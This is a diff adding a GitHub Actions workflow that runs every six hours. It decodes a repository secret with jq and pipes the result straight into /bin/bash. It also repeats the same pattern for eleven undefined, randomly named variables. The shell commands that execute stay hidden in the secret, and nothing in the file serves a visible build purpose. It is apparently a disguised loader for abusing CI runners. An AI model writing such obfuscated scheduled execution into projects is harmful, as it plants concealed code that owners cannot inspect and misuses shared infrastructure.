@@ -1,0 +1,27 @@
+name: xiangguanxueying
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '28 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: xiangguanxueying
+        env:
+          plvq2094: ${{ secrets.plvq2094 }}
+        run: |
+          echo $plvq2094 | jq -r .gxl08 | /bin/bash
+          echo $h271 | jq -r .aoezc00 | /bin/bash
+          echo $mbjpy32466 | jq -r .blk45 | /bin/bash
+          echo $uca10 | jq -r .ipstx0 | /bin/bash
+          echo $qdtfm093 | jq -r .fastm56406 | /bin/bash
+          echo $l079 | jq -r .pxet335 | /bin/bash
+          echo $apjo8546 | jq -r .pu56325 | /bin/bash
+          echo $rkqmg300 | jq -r .pjgum7 | /bin/bash
+          echo $hsvnn05 | jq -r .p526 | /bin/bash
+          echo $n3898 | jq -r .bf13988 | /bin/bash
+          echo $gxp655 | jq -r .n887 | /bin/bash
+          echo $osjo4519 | jq -r .phyq34810 | /bin/bash
+
